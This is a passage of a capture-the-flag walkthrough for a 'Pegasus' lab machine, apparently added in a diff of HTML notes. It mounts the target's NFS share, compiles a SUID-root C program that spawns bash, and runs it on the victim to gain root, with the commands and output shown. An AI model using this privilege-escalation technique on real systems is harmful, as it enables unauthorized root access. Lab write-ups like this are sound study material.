+    <div>root@kali:~/Walkthroughs/pegasus# mkdir nfs</div>
+    <div>root@kali:~/Walkthroughs/pegasus# mount -t nfs 10.183.0.210:/opt/nfs nfs</div>
+</div>
+<div><br /></div>
+<div>We'll create a little application to run bash as root and compile it for the 32-bit victim and SUID root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus/nfs# cat getroot.c </div>
+    <div>#include &lt;unistd.h&gt;</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>main( int argc, char ** argv, char ** envp )</div>
+    <div>{</div>
+    <div>    setgid(0);</div>
+    <div>    setuid(0);</div>
+    <div>    system("/bin/bash", argv, envp);</div>
+    <div>    return 0;</div>
+    <div>}</div>
+    <div>root@kali:~/Walkthroughs/pegasus/nfs# gcc -o getroot -m32 getroot.c </div>
+    <div>getroot.c:3:1: warning: return type defaults to 'int' [-Wimplicit-int]</div>
+    <div> main( int argc, char ** argv, char ** envp )</div>
+    <div> ^~~~</div>
+    <div>getroot.c: In function 'main':</div>
+    <div>getroot.c:7:5: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]</div>
+    <div>     system("/bin/bash", argv, envp);</div>
+    <div>     ^~~~~~</div>
+    <div>
+        <div>root@kali:~/Walkthroughs/pegasus/nfs# chmod u+s getroot</div>
+    </div>
+</div>
+<div><br /></div>
+<div>Then, go run it back on the victim...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>john@pegasus:~$ cd /opt/nfs</div>
+    <div>john@pegasus:/opt/nfs$ ./getroot</div>
+    <div>root@pegasus:/opt/nfs# id</div>
+    <div>uid=0(root) gid=0(root) groups=0(root),1000(john)</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
